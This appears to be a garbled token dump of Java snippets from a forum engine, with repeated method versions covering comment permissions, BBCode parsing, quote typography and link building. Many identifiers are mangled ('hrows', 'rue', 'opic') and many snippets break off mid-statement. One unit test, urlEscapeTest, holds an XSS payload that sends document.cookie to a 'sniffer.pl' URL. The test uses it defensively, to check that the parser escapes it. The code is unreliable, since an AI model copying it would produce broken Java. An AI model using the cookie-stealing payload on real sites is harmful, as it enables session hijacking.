public int doStartTag ( ) hrows JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; TODO: move to globals data.put("dateFormat", new SignTag.DateFormatHandler()); jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public int doStartTag ( ) hrows JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; data . put ( " opic " , ImmutableMap . of ( " id " , opic . getId ( ) , " link " , opic . getLink ( ) ) ) ; data . put ( " showMenu " , showMenu ) ; TODO: move to globals data.put("dateFormat", new SignTag.DateFormatHandler()); jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public int doStartTag ( ) hrows JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; data . put ( " opic " , new ApiCommentTopicInfo ( opic . getId ( ) , opic . getLink ( ) , commentsAllowed ) ) ; data . put ( " showMenu " , showMenu ) ; TODO: move to globals data.put("dateFormat", new SignTag.DateFormatHandler()); jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public static String getNewsViewerLink ( int section ) hrows SectionNotFoundException { String urlName = getUrlName ( section ) ; switch ( section ) { case SECTION_FORUM : 
public void checkView ( @Nonnull Topic message , @Nullable User currentUser ) hrows MessageNotFoundException { if ( currentUser ! = null & & currentUser . isModerator ( ) ) { return ; } if ( message . isDeleted ( ) ) { if ( message . isExpired ( ) ) { 
public Map < String , Object > getComments ( @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " page " , defaultValue = " 0 " ) int page , HttpServletRequest request ) hrows Exception { Topic opic = opicDao . getById ( msgid ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; if ( ! section . getUrlName ( ) . equals ( sectionName ) | | ! group . getUrlName ( ) . equals ( groupName ) | | page < 0 ) { hrow new MessageNotFoundException ( msgid ) ; } permissionService . checkView ( opic , AuthUtil . getCurrentUser ( ) ) ; CommentList comments = commentService . getCommentList ( opic , false ) ; CommentFilter cv = new CommentFilter ( comments ) ; int messagesPerPage = AuthUtil . getCurrentProfile ( ) . getProperties ( ) . getMessages ( ) ; List < Comment > commentsFiltered = cv . getCommentsForPage ( false , page , messagesPerPage , ImmutableSet . < Integer > of ( ) ) ; List < PreparedComment > preparedComments = prepareService . prepareCommentList ( comments , commentsFiltered , request . isSecure ( ) , Template . getTemplate ( request ) , opic ) ; return ImmutableMap . < String , Object > of ( " comments " , preparedComments ) ; } 
public Map < String , Object > getComments ( @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " page " , defaultValue = " 0 " ) int page , HttpServletRequest request ) hrows Exception { Topic opic = opicDao . getById ( msgid ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; if ( ! section . getUrlName ( ) . equals ( sectionName ) | | ! group . getUrlName ( ) . equals ( groupName ) | | page < 0 ) { hrow new MessageNotFoundException ( msgid ) ; } permissionService . checkView ( opic , AuthUtil . getCurrentUser ( ) ) ; CommentList comments = commentService . getCommentList ( opic , false ) ; CommentFilter cv = new CommentFilter ( comments ) ; int messagesPerPage = AuthUtil . getCurrentProfile ( ) . getProperties ( ) . getMessages ( ) ; List < Comment > commentsFiltered = cv . getCommentsForPage ( false , page , messagesPerPage , ImmutableSet . < Integer > of ( ) ) ; List < PreparedComment > preparedComments = prepareService . prepareCommentList ( comments , commentsFiltered , request . isSecure ( ) , Template . getTemplate ( request ) , opic ) ; return ImmutableMap . < String , Object > of ( " comments " , preparedComments , 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " ext " ) String ext , @PathVariable String nick ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = mpl . getCurrentUser ( ) ; User refUser = userDao . getUser ( nick ) ; Remark rm = userDao . getRemark ( user , refUser ) ; if ( rm ! = null ) { userDao . updateRemark ( rm . getId ( ) , ext ) ; } else { userDao . setRemark ( user , refUser , ext ) ; } return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public void updateRemark ( int id , String ext ) { if ( ext . length ( ) = = 0 ) jdbcTemplate . update ( " DELETE FROM user_remarks WHERE id=? " , id ) ; 
public boolean isCommentsEditingAllowed ( CommentRequest commentRequest , HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; final boolean haveAnswers = commentService . isHaveAnswers ( commentRequest . getOriginal ( ) ) ; return isCommentEditableNow ( commentRequest . getOriginal ( ) , 
public boolean isCommentDeletableNow ( Comment comment , @Nullable User currentUser , Topic opic , boolean haveAnswers ) { if ( comment . isDeleted ( ) | | opic . isDeleted ( ) ) { return false ; } if ( currentUser = = null | | currentUser . isAnonymous ( ) ) { return false ; } boolean moderatorMode = currentUser . isModerator ( ) ; boolean authored = currentUser . getId ( ) = = comment . getUserid ( ) ; long nowTimestamp = System . currentTimeMillis ( ) ; return moderatorMode | | ( ! opic . isExpired ( ) & & 
public boolean followAuthorLinks ( User author ) { if ( author . isBlocked ( ) | | author . isAnonymous ( ) ) { return false ; } return author . getScore ( ) > = LINK_FOLLOW_MIN_SCORE ; } 
private void rawPushTextNode ( RootNode rootNode , Node currentNode , String ext , boolean isCode ) { if ( ! isCode ) { ext = changer . changeBatch ( ext ) ; 
public String format ( String ext , boolean secure , boolean nofollow ) { String escapedText = StringUtil . escapeHtml ( ext ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String oken = st . nextToken ( ) ; String formattedToken = formatURL ( oken , secure , nofollow ) ; sb . append ( formattedToken ) ; } return sb . oString ( ) ; } 
public String simpleFormat ( String ext ) { return StringUtil . escapeHtml ( ext ) ; } 
private static boolean isQuoteChar ( char ch ) { return ch = = QUOTE_SYMBOL | | ch = = QUOTE_OUT_OPEN | | ch = = QUOTE_OUT_CLOSE | | 
private static boolean isPunctuation ( char ch ) { char [ ] punctuation = { '.' , ',' , ':' , ';' , '-' , '!' , '?' } ; for ( char est : punctuation ) if ( est = = ch ) return rue ; return false ; } 
private static boolean isQuoteClosing ( String buff , int position ) { char before , after ; if ( position = = 0 ) return false ; else if ( position = = buff . length ( ) - 1 ) return rue ; after = buff . charAt ( position + 1 ) ; before = buff . charAt ( position - 1 ) ; if ( ! Character . isWhitespace ( after ) & & ! isPunctuation ( after ) & & ! isQuoteChar ( after ) ) return false ; return rue ; } 
private void rawPushTextNode ( RootNode rootNode , Node currentNode , String ext , boolean isCode ) { if ( ! isCode ) { ext = changer . format ( ext ) ; 
private void rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String ext ) { if ( ! automatonState . isCode ( ) ) { ext = changer . format ( ext ) ; 
private Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node empNode = currentNode ; while ( rue ) { if ( empNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( empNode ) ) { TagNode node = ( TagNode ) empNode ; String agName = node . getBbtag ( ) . getName ( ) ; if ( agName . equals ( name ) | | ( " url " . equals ( name ) & & " url2 " . equals ( agName ) ) ) { currentNode = empNode ; currentNode = ascend ( currentNode ) ; break ; } } empNode = empNode . getParent ( ) ; } return currentNode ; } 
private Node processCloseTag ( ParserAutomatonState automatonState , Node currentNode , boolean agNameIsCode ) { if ( ! automatonState . isCode ( ) | | agNameIsCode ) { currentNode = closeTagNode ( automatonState . getRootNode ( ) , currentNode , automatonState . getTagname ( ) ) ; } else { currentNode = pushTextNode ( automatonState , currentNode , automatonState . getWholematch ( ) ) ; } if ( agNameIsCode ) { automatonState . setCode ( false ) ; } return currentNode ; } 
public void processTagMatcher ( Matcher match ) { agname = match . group ( 1 ) . oLowerCase ( ) ; parameter = match . group ( 3 ) ; wholematch = match . group ( 0 ) ; if ( ! StringUtils . isEmpty ( parameter ) ) { parameter = parameter . substring ( 1 ) ; 
public boolean isTagEscaped ( ) { return wholematch . startsWith ( " [[ " ) & & wholematch . endsWith ( " ]] " ) ; } 
public boolean isCloseTag ( ParserAutomatonState automatonState ) { return wholematch . startsWith ( " [/ " ) | | wholematch . startsWith ( " [[/ " ) ; } 
public boolean isFirstCode ( ) { return firstCode ; } 
public void parse ( ) { given when parser.parseRoot(rootNode, inputString); then String actualResult = rootNode.renderXHtml(); Assert.assertEquals(expectedResult, actualResult); } 
public static Collection < Object [ ] > data ( ) { Object [ ] [ ] data = new Object [ ] [ ] { { " [list][*]fdfdddfd[/list][[raw]] " , " <ul><li>fdfdddfd</li></ul><p>[[raw]]</p> " } , { " [list][*]fdfdddfd[list][[raw]] " , " <ul><li>fdfdddfd[[raw]]</li></ul> " } , { " [code][list][*]fdfdddfd[list][[raw]][/code][/code] " , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]fdfdddfd[list][[raw]]</code></pre></div> " } , } ; return Arrays . asList ( data ) ; } 
public void processTitle ( ) { given when String actualResult = StringUtil.processTitle("one -- two --- three -- four-- five --six --"); then Assert.assertEquals("one&nbsp;&mdash; two --- three&nbsp;&mdash; four-- five --six --", actualResult); } 
public void checkQuotesDecorator ( ) { given RuTypoChanger ruTypoChanger = new RuTypoChanger(); when String actualResult = ruTypoChanger.format(inputString); then Assert.assertEquals(expectedResult, actualResult); } 
public void checkQuotesDecoratorWithReset ( ) { given typoChanger.reset(); when String actualResult = typoChanger.format(inputString); then Assert.assertEquals(expectedResult, actualResult); } 
public Set < Integer > makeHideSet ( CommentList comments , int filterChain , @Nonnull Set < Integer > ignoreList ) hrows SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return ImmutableSet . of ( ) ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ! ignoreList . isEmpty ( ) ) { comments . getRoot ( ) . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public Set < Integer > get ( @Nonnull User user ) { final Builder < Integer > builder = ImmutableSet . builder ( ) ; jdbcTemplate . query ( queryIgnoreList , new RowCallbackHandler ( ) { @Override public void processRow ( ResultSet resultSet ) hrows SQLException { builder . add ( resultSet . getInt ( " ignored " ) ) ; } } , user . getId ( ) ) ; return builder . build ( ) ; } 
private static char firstNonQuote ( String buff , int start ) { for ( int pt = start ; pt > = 0 ; pt - - ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( 0 ) ; } 
private static char lastNonQuote ( String buff , int start ) { for ( int pt = start ; pt < buff . length ( ) ; pt + + ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( buff . length ( ) - 1 ) ; } 
private static boolean isQuoteClosing ( String buff , int position ) { char before , after ; if ( position = = 0 ) return false ; else if ( position = = buff . length ( ) - 1 ) return rue ; after = lastNonQuote ( buff , position + 1 ) ; before = firstNonQuote ( buff , position - 1 ) ; if ( isQuoteChar ( before ) ) return false ; if ( ! Character . isWhitespace ( after ) & & ! isPunctuation ( after ) & & ! isQuoteChar ( after ) ) return false ; return rue ; } 
private static boolean isPunctuation ( char ch ) { for ( char est : PUNCTUATION ) if ( est = = ch ) return rue ; return false ; } 
private static char firstNonQuote ( String buff , int start ) { for ( int pt = start - 1 ; pt > = 0 ; pt - - ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( 0 ) ; } 
private static char lastNonQuote ( String buff , int start ) { for ( int pt = start + 1 ; pt < buff . length ( ) ; pt + + ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( buff . length ( ) - 1 ) ; } 
private static boolean isQuoteClosing ( String buff , int position ) { char before , after ; if ( position = = 0 ) return false ; else if ( position = = buff . length ( ) - 1 ) return rue ; after = lastNonQuote ( buff , position ) ; before = firstNonQuote ( buff , position ) ; if ( isQuoteChar ( before ) ) return false ; if ( ! Character . isWhitespace ( after ) & & ! isPunctuation ( after ) & & ! isQuoteChar ( after ) ) return false ; return rue ; } 
public static String processTitle ( String itle ) { return itle . replaceAll ( ToHtmlFormatter . MDASH_REGEX , ToHtmlFormatter . MDASH_REPLACE ) ; } 
public void makeTitle ( ) { given when String actualResult = StringUtil.makeTitle("\"Test of \"quotes '' \"in quotes\" in title\"\""); then Assert.assertEquals("&laquo;Test of &bdquo;quotes &quot; &bdquo;in quotes&ldquo; in title&ldquo;&raquo;", actualResult); } 
public void estInCodeQuotes ( ) { assertEquals ( " <p>Smth about &laquo;quotes&raquo;? Look here: <div class= \" code \" ><pre class= \" no-highlight \" ><code>I love to eat &quot;white&quot; icecream</code></pre></div></p> " , 
public void reset ( ) { his . quoteDepth = 0 ; his . localBuff = " " ; } 
private boolean isQuoteClosing ( String buff , int position ) { char before , after ; if ( position = = 0 & & localBuff . equals ( " " ) ) return false ; else if ( position = = buff . length ( ) - 1 ) return rue ; after = lastNonQuote ( buff , position ) ; if ( position = = 0 ) before = firstNonQuote ( localBuff , localBuff . length ( ) ) ; else before = firstNonQuote ( buff , position ) ; if ( isQuoteChar ( before ) ) return false ; if ( ! Character . isWhitespace ( after ) & & ! isPunctuation ( after ) & & ! isQuoteChar ( after ) ) return false ; return rue ; } 
public void estLocalBuffer ( ) { assertEquals ( " <p>This is simple &laquo;local <u>buffer</u>&raquo; test </p> " , 
public ModelAndView mainPage ( HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; List < Topic > messages = opicListService . getMainPageFeed ( mpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ) ; if ( mpl . isModeratorSession ( ) | | mpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForInt ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForInt ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! mpl . isSessionAuthorized ( ) | | ! mpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) String nocache , @RequestParam ( required = false ) Integer cid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } Topic opic = messageDao . getById ( msgid ) ; String redirectUrl = opic . getLink ( ) ; StringBuilder options = new StringBuilder ( ) ; if ( page ! = null ) { redirectUrl = opic . getLinkPage ( page ) ; } if ( nocache ! = null ) { options . append ( " nocache= " ) ; options . append ( URLEncoder . encode ( nocache , " UTF-8 " ) ) ; } StringBuilder hash = new StringBuilder ( ) ; if ( options . length ( ) > 0 ) { return new ModelAndView ( new RedirectView ( redirectUrl + '?' + options + hash ) ) ; 
public RedirectView deleteImage ( @RequestParam ( required = rue ) int id , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , mpl . getCurrentUser ( ) ) ; imageService . deleteImage ( mpl . getCurrentUser ( ) , image ) ; return new RedirectView ( TopicLinkBuilder . baseLink ( opic ) . forceLastmod ( ) . build ( ) ) ; } 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } Topic opic = messageDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( opic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( opic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
public static TopicLinkBuilder baseLink ( Topic opic ) { return new TopicLinkBuilder ( UriComponentsBuilder . fromUriString ( opic . getLink ( ) ) , opic , 0 ) ; } 
public static TopicLinkBuilder pageLink ( Topic opic , int page ) { return new TopicLinkBuilder ( UriComponentsBuilder . fromUriString ( opic . getLinkPage ( page ) ) , opic , page ) ; } 
public TopicLinkBuilder showDeleted ( ) { builder . queryParam ( " deleted " , " rue " ) ; return his ; } 
public TopicLinkBuilder forceLastmod ( ) { builder . queryParam ( " lastmod " , opic . getLastModified ( ) . getTime ( ) ) ; return his ; } 
public TopicLinkBuilder comment ( int cid ) { builder . fragment ( " comment- " + cid ) ; return his ; } 
public TopicLinkBuilder filter ( int filter ) { TODO: use Enum for filter builder.queryParam( "filter", CommentFilter.toString(filter) ); return this; } 
public String build ( ) { return builder . build ( ) . oUriString ( ) ; } 
public boolean followInTopic ( Topic opic , User author ) { return ! opic . isCommited ( ) & & followAuthorLinks ( author ) ; } 
public String parseTopicWithMinimizedCut ( String ext , String cutURL , boolean secure , boolean nofollow ) { return defaultParser . parseRoot ( prepareTopicRootNode ( rue , cutURL , secure , nofollow ) , ext ) . renderXHtml ( ) ; } 
public String parseTopic ( String ext , boolean secure , boolean nofollow ) { return defaultParser . parseRoot ( prepareTopicRootNode ( false , null , secure , nofollow ) , ext ) . renderXHtml ( ) ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure , boolean nofollow ) { RootNode rootNode = defaultParser . getRootNode ( ) ; if ( minimizeCut ) { ry { LorURL lorCutURL = new LorURL ( configuration . getMainURI ( ) , cutURL ) ; if ( lorCutURL . isTrueLorUrl ( ) ) { URI fixURI = new URI ( lorCutURL . fixScheme ( secure ) , rue , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public void inCodeEscape ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&amp;#9618;</code></pre></div> " , lorCodeService . parseTopic ( " [code]&#9618;[/code] " , false , false ) ) ; assertEquals ( " <p>&#9618;</p> " , 
public void cut4Test ( ) { Assert . assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/CUT][cut]test[/cut] " , false , false ) ) ; 
public void cut4Test ( ) { Assert . assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/cut][cut]test[/cut] " , false , false ) ) ; 
public boolean followInTopic ( Topic opic , User author ) { return opic . isCommited ( ) | | followAuthorLinks ( author ) ; } 
public Integer apply ( Topic opic ) { return opic . getId ( ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { ags . put ( resultSet . getInt ( " msgid " ) , resultSet . getString ( " value " ) ) ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , ProfileProperties profileProperties , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > ags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , secure , profileProperties , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > ags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , null , extMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public boolean isHaveAnswers ( @Nonnull Comment comment ) { return commentDao . isHaveAnswers ( comment . getId ( ) ) ; } 
public boolean isCommentsEditingAllowed ( @Nonnull Comment comment , @Nonnull Topic opic , HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; final boolean haveAnswers = commentService . isHaveAnswers ( comment ) ; return isCommentEditableNow ( comment , 
private boolean isQuoteClosing ( String buff , int position ) { char before , after ; if ( position = = 0 & & localBuff . equals ( " " ) ) return false ; else if ( position = = buff . length ( ) - 1 ) return rue ; after = lastNonQuote ( buff , position ) ; if ( position = = 0 ) before = firstNonQuote ( localBuff , localBuff . length ( ) ) ; else before = firstNonQuote ( buff , position ) ; if ( isQuoteChar ( before ) ) return false ; if ( Character . isLetterOrDigit ( after ) ) return false ; return rue ; } 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false , false ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&laquo;http:127.0.0.1/sniffer.pl?&bdquo;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false , false ) ) ; 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false , false ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&laquo;http:127.0.0.1/sniffer.pl?&raquo;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false , false ) ) ; 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , ProfileProperties profileProperties , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > opicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , rue ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profileProperties . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profileProperties . getAvatarMode ( ) ) ; } String userAgent ; if ( currentUser ! = null & & currentUser . isModerator ( ) ) { userAgent = userAgentDao . getUserAgentById ( message . getMessage ( ) . getUserAgent ( ) ) ; } else { userAgent = null ; } return new TopicMenu ( opicEditable , 
public List < Integer > doDeleteReplys ( int msgid , User user , boolean score ) { List < Integer > deleted = deleteReplys ( msgid , user , score , 0 ) ; return deleted ; } 
public List < Integer > deleteWithReplys ( int msgid , String reason , User user , int scoreBonus ) { List < Integer > deleted = commentDao . doDeleteReplys ( msgid , user , scoreBonus > 2 ) ; boolean deletedMain = commentDao . deleteComment ( msgid , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( msgid ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { return doDeleteReplys ( msgid , user , score , 0 ) ; } 
public List < Integer > deleteWithReplys ( int msgid , String reason , User user , int scoreBonus ) { List < Integer > deleted = commentDao . deleteReplys ( msgid , user , scoreBonus > 2 ) ; boolean deletedMain = commentDao . deleteComment ( msgid , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( msgid ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
private void rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String ext ) { if ( ! automatonState . isCode ( ) ) { ext = automatonState . changer . format ( ext ) ; 
private void rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String ext ) { if ( ! automatonState . isCode ( ) ) { ext = automatonState . getTypoChanger ( ) . format ( ext ) ; 
private void doResize ( File uploadedFile ) hrows IOException { if ( mainFile . exists ( ) ) { mainFile . delete ( ) ; } FileUtils . moveFile ( uploadedFile , mainFile ) ; boolean error = rue ; ry { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public static void resizeImage ( String filename , String iconname , int size ) hrows IOException { BufferedImage source = ImageIO . read ( new File ( filename ) ) ; BufferedImage destination = Scalr . resize ( source , size ) ; ImageIO . write ( destination , " JPEG " , new File ( iconname ) ) ; } 
public ModelAndView showForm ( ) { return new ModelAndView ( " addphoto " ) ; } 
public int doStartTag ( ) hrows JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { ry { StringBuilder buf = new StringBuilder ( ) ; for ( String el : list ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } if ( TagService . isGoodTag ( el ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( TopicListController . agListUrl ( el ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el ) ) ; } } out . append ( buf ) ; } catch ( IOException e ) { hrow new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , ProfileProperties profileProperties , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > opicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , rue ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profileProperties . isShowPhotos ( ) ) { String avatarMode = profileProperties . getAvatarMode ( ) ; if ( " empty " . equals ( avatarMode ) ) { avatarMode = " mm " ; } userpic = userService . getUserpic ( message . getAuthor ( ) , secure , avatarMode ) ; } String userAgent ; if ( 